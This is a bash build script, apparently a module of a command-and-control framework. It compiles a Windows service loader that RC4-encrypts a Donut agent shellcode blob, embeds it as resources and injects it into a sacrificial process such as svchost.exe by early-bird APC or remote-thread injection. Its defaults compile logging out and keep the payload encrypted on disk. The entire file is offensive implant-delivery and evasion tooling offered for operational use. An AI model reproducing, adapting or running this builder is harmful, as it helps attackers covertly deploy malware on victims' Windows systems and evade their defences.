#!/usr/bin/env bash
# Build a one-shot Windows service loader from a Donut sRDI shellcode blob.
#
# Runs on the C2 as a local module ("svc_loader"). Requires:
#   * a MinGW-w64 cross compiler matching --arch
#     (Linux: apt install gcc-mingw-w64-x86-64 / gcc-mingw-w64-i686,
#      Windows/msys2: mingw-w64-x86_64-gcc / mingw-w64-i686-gcc)
#   * a native C compiler (cc/gcc/clang) for the small RC4 pack helper
#
# Shared payload sources (rc4, ntsys) come from ../common/ (mirrored into the
# operator workspace next to this module, like bof_common).
#
# The shellcode is RC4-encrypted with a fresh random key (or the one given
# with --key) and embedded into the .exe as RCDATA resources by windres, so
# the blob never sits in plaintext on disk.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ---- parameters (defaults mirror config.json) ----
SHELLCODE=""
OUTPUT=""
PROCESS="svchost.exe"
PROCESS_ARGS=""
ARCH="x64"
KEY=""
INJECT="apc"
DEBUG_FLAG=""

print_usage() {
  cat <<'EOF'
usage: build.sh --shellcode <agent.bin> [options]

options:
  --shellcode <path>   Donut sRDI shellcode .bin to embed (required)
  --output <path>      output .exe (default: <shellcode dir>/<name>_svc.exe)
  --process <name>     sacrificial process: bare name (System32) or full path
                       (default: svchost.exe, e.g. dllhost.exe)
  --process-args <s>   optional args for the sacrificial process
  --arch <x64|x86>     architecture of blob and loader (default: x64)
  --key <hex>          RC4 key as hex; random 16-byte key when omitted
  --inject <apc|ct>    load method: apc = early-bird QueueUserAPC (default),
                       ct = classic CreateRemoteThread (needs a sacrificial
                       that stays alive)
  --debug              keep verbose diagnostics in the binary (default: no;
                       production builds compile all logging out)
EOF
}

# resolve to an absolute path without requiring the target to exist
abspath() {
  local p="$1"
  case "$p" in
  /* | [A-Za-z]:* | //*)
    printf '%s' "$p"
    ;;
  *)
    local d b resolved
    d="$(dirname "$p")"
    b="$(basename "$p")"
    if resolved="$(cd "$d" 2>/dev/null && pwd)"; then
      printf '%s/%s' "$resolved" "$b"
    else
      printf '%s/%s' "$(pwd)" "$p"
    fi
    ;;
  esac
}

needs_value() {
  case "$1" in
  --shellcode | --output | --process | --process-args | --process_args | --arch | --key | --inject)
    return 0
    ;;
  esac
  return 1
}

set_opt() {
  local key="$1" val="$2"
  case "$key" in
  --shellcode) SHELLCODE="$val" ;;
  --output) OUTPUT="$val" ;;
  --process) PROCESS="$val" ;;
  --process-args | --process_args) PROCESS_ARGS="$val" ;;
  --arch) ARCH="$val" ;;
  --key) KEY="$val" ;;
  --inject) INJECT="$val" ;;
  --debug)
    case "$val" in
    true | 1 | yes) DEBUG_FLAG="1" ;;
    false | 0 | no | "") DEBUG_FLAG="" ;;
    *) DEBUG_FLAG="1" ;;
    esac
    ;;
  esac
}

# ---- parse args (order independent, tolerant of unknown flags such as the
# ---- universal --token/--user/--ticket injected by the C2 console)
while [[ $# -gt 0 ]]; do
  case "$1" in
  --help | -h)
    print_usage
    exit 0
    ;;
  --debug)
    # boolean-ish flag; may be followed by an explicit value from the C2
    # console (--debug false/true) or appear bare
    if [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
      case "$2" in
      true | 1 | yes) DEBUG_FLAG="1" ;;
      false | 0 | no | "") DEBUG_FLAG="" ;;
      *) DEBUG_FLAG="1" ;;
      esac
      shift 1
    else
      DEBUG_FLAG="1"
    fi
    shift 1
    ;;
  --*=*)
    set_opt "${1%%=*}" "${1#*=}"
    shift 1
    ;;
  --*)
    if needs_value "$1" && [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
      set_opt "$1" "$2"
      shift 2
    else
      set_opt "$1" ""
      shift 1
    fi
    ;;
  *)
    shift 1
    ;;
  esac
done

# ---- toolchain selection ----
case "$ARCH" in
x64 | amd64)
  CC="x86_64-w64-mingw32-gcc"
  WINTARGET="pe-x86-64"
  ;;
x86 | 386)
  CC="i686-w64-mingw32-gcc"
  WINTARGET="pe-i386"
  ;;
*)
  echo "[-] unsupported arch: $ARCH (use x64 or x86)" >&2
  exit 1
  ;;
esac

# The resource compiler: prefer the arch-prefixed windres (Linux cross
# toolchains), otherwise the unprefixed windres that MSYS2 ships next to the
# compiler (mingw64/bin, mingw32/bin). The explicit --target below pins the
# output format either way.
find_windres() {
  if command -v "${CC%-gcc}-windres" >/dev/null 2>&1; then
    printf '%s' "${CC%-gcc}-windres"
    return 0
  fi
  local ccpath dir
  if ccpath="$(command -v "$CC" 2>/dev/null)" && dir="$(dirname "$ccpath")"; then
    if [[ -x "$dir/windres.exe" ]]; then
      printf '%s' "$dir/windres.exe"
      return 0
    fi
    if [[ -x "$dir/windres" ]]; then
      printf '%s' "$dir/windres"
      return 0
    fi
  fi
  if command -v windres >/dev/null 2>&1; then
    printf '%s' "windres"
    return 0
  fi
  return 1
}

HOSTCC=""
for c in cc gcc clang; do
  if command -v "$c" >/dev/null 2>&1; then
    HOSTCC="$c"
    break
  fi
done

# ---- validate ----
if [[ -z "$SHELLCODE" ]]; then
  echo "[-] --shellcode is required" >&2
  print_usage
  exit 1
fi
if [[ ! -f "$SHELLCODE" ]]; then
  echo "[-] shellcode file not found: $SHELLCODE" >&2
  exit 1
fi
if [[ -z "$HOSTCC" ]]; then
  echo "[-] no host C compiler found (need cc/gcc/clang for the RC4 pack helper)" >&2
  exit 1
fi
if ! command -v "$CC" >/dev/null 2>&1; then
  echo "[-] missing cross compiler: $CC" >&2
  echo "    Linux:  apt install gcc-mingw-w64-$( [[ "$ARCH" == x64 ]] && echo x86-64 || echo i686 )" >&2
  echo "    msys2:  pacman -S mingw-w64-$( [[ "$ARCH" == x64 ]] && echo x86_64 || echo i686 )-gcc" >&2
  exit 1
fi
if ! WINDRES="$(find_windres)"; then
  echo "[-] missing resource compiler (windres) for $CC" >&2
  exit 1
fi

SHELLCODE_ABS="$(abspath "$SHELLCODE")"

# ---- default output: <shellcode dir>/<base without .bin/.exe>_svc.exe ----
if [[ -z "$OUTPUT" ]]; then
  base="$(basename "$SHELLCODE_ABS")"
  case "$base" in
  *.bin) base="${base%.bin}" ;;
  *.*) base="${base%.*}" ;;
  esac
  case "$base" in
  *.exe) base="${base%.exe}" ;;
  esac
  OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}_svc.exe"
fi
OUTPUT_ABS="$(abspath "$OUTPUT")"
mkdir -p "$(dirname "$OUTPUT_ABS")"

echo "[+] svc_loader build:"
echo "    shellcode: $SHELLCODE_ABS ($(wc -c <"$SHELLCODE_ABS" | tr -d '[:space:]') bytes)"
echo "    arch:      $ARCH"
echo "    process:   $PROCESS${PROCESS_ARGS:+ args: $PROCESS_ARGS}"
echo "    inject:    $INJECT"
echo "    key:       $([[ -n "$KEY" ]] && echo 'provided' || echo 'random (generated)')"
echo "    output:    $OUTPUT_ABS"
echo "    logging:   $([[ -n "$DEBUG_FLAG" ]] && echo 'DEBUG (verbose, keep in binary)' || echo 'none (compiled out)')"

# ---- build in a scratch dir so no artifacts pollute the module tree ----
BUILDDIR="$(mktemp -d "${TMPDIR:-/tmp}/svc_loader.XXXXXX")"
trap 'rm -rf "$BUILDDIR"' EXIT

cp "$SCRIPT_DIR"/loader.c "$SCRIPT_DIR"/loader.rc "$SCRIPT_DIR"/loader_ids.h \
  "$SCRIPT_DIR"/../common/rc4.c "$SCRIPT_DIR"/../common/rc4.h \
  "$SCRIPT_DIR"/../common/ntsys.c "$SCRIPT_DIR"/../common/ntsys.h \
  "$SCRIPT_DIR"/config.h "$SCRIPT_DIR"/pack.c \
  "$BUILDDIR"/

# ---- bake sacrificial process / args into config.h (escape C wide strings) ----
esc_c() {
  printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
}
{
  printf '/* generated by build.sh */\n'
  printf '#ifndef SVC_LOADER_CONFIG_H\n'
  printf '#define SVC_LOADER_CONFIG_H\n'
  printf '#define SACRIFICIAL_PROCESS L"%s"\n' "$(esc_c "$PROCESS")"
  printf '#define SACRIFICIAL_ARGS L"%s"\n' "$(esc_c "$PROCESS_ARGS")"
  printf '#endif /* SVC_LOADER_CONFIG_H */\n'
} >"$BUILDDIR/config.h"

cd "$BUILDDIR"

# ---- RC4-encrypt the blob + write key.bin (host-native helper) ----
# MinGW's gcc driver appends .exe to extension-less -o names, so pick the
# actual binary name instead of assuming ./pack.
PACK_OUT="pack"
"$HOSTCC" -O2 -Wall -o "$PACK_OUT" pack.c rc4.c
if [[ ! -x "$PACK_OUT" && -x "pack.exe" ]]; then
  PACK_OUT="pack.exe"
fi
if [[ -n "$KEY" ]]; then
  ./"$PACK_OUT" "$SHELLCODE_ABS" payload.bin key.bin "$KEY"
else
  ./"$PACK_OUT" "$SHELLCODE_ABS" payload.bin key.bin
fi

# ---- compile loader + resources (MinGW-w64) ----
INJECT_FLAG=""
[[ "$INJECT" == ct ]] && INJECT_FLAG="-DCLASSIC_INJECT"
"$CC" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} $INJECT_FLAG -DUNICODE -D_UNICODE \
  -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -I. -c loader.c -o loader.o
"$CC" -O2 -Wall -Wextra -I. -c ntsys.c -o ntsys.o
"$CC" -O2 -Wall -Wextra -c rc4.c -o rc4.o
"$WINDRES" --target="$WINTARGET" -I. -i loader.rc -o resources.o
"$CC" -O2 -s -o loader_svc.exe loader.o rc4.o ntsys.o resources.o -ladvapi32 -lshell32

# ---- sanity check the PE before copying it out ----
if [[ ! -s loader_svc.exe ]]; then
  echo "[-] link produced an empty output" >&2
  exit 1
fi
magic="$(head -c 2 loader_svc.exe | od -An -tx1 | tr -d ' \n')"
if [[ "$magic" != "4d5a" ]]; then
  echo "[-] output is not a PE executable (magic $magic)" >&2
  exit 1
fi

cp loader_svc.exe "$OUTPUT_ABS"
SIZE="$(wc -c <"$OUTPUT_ABS" | tr -d '[:space:]')"
echo "[+] wrote $OUTPUT_ABS ($SIZE bytes)"
if command -v sha256sum >/dev/null 2>&1; then
  echo "    sha256: $(sha256sum "$OUTPUT_ABS" | awk '{print $1}')"
elif command -v shasum >/dev/null 2>&1; then
  echo "    sha256: $(shasum -a 256 "$OUTPUT_ABS" | awk '{print $1}')"
fi
